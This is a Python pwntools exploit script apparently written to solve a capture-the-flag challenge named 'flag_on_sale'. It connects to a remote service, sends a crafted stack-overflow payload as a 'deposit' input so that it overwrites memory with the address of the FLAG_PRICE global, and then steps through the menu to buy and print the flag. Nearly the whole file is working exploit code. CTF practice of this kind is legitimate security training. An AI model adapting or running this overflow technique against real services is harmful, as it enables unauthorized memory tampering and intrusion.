from pwn import *

# Starty Proccess
p = remote('10.56.50.66', 2113)
# p = process('./flag_on_sale')

# Load the ELF binary
binary = ELF('./flag_on_sale')

# Dynamically get the address of the global variable FLAG_PRICE
flag_price_addr = binary.symbols['FLAG_PRICE']

# Construct payload (You can determine what is to be injected by examining the stack in a debugger)

#We want the buffer to contain and ASCII "1" because we still want the program to accept our deposit amount
buffer_content = b"\x31" + b"\x00" * 15
# this is a copy of the stack memory inbetween the buffer and the target overwrite address, goal is to not corrupt anything but address we want to overwrite 
padding = p64(0x7fffffffe1b0) + b"\xcb\x0c\x40\x00" + b"\x00" * 4 
#add the replacement address at the end 
payload = buffer_content + padding +  p64(flag_price_addr)

# Interact with the binary and inject payload as deposit input
p.sendlineafter(b">\n", b"b")    
p.sendlineafter(b">\n", b"m")
p.sendlineafter(b": ", b"username")
p.sendlineafter(b": ", b"password")
p.sendlineafter(b"continue\n", b"\n")
p.sendlineafter(b">\n", b"a")
p.sendlineafter(b": ", b"username")
p.sendlineafter(b": ", b"password")
p.sendlineafter(b">\n", b"d")
p.sendlineafter(b": ", payload)
p.sendlineafter(b"continue\n", b"\n")
p.sendlineafter(b">\n", b"e")
p.sendlineafter(b">\n", b"e")
p.sendlineafter(b">\n", b"s")
p.sendlineafter(b">\n", b"p")
p.sendlineafter(b"continue\n", b"\n")
p.sendlineafter(b">\n", b"e")
p.sendlineafter(b">\n", b"f")

# Get all output whihc will alos contian the flag
output = p.recvall()
print(output.decode(errors="ignore"))
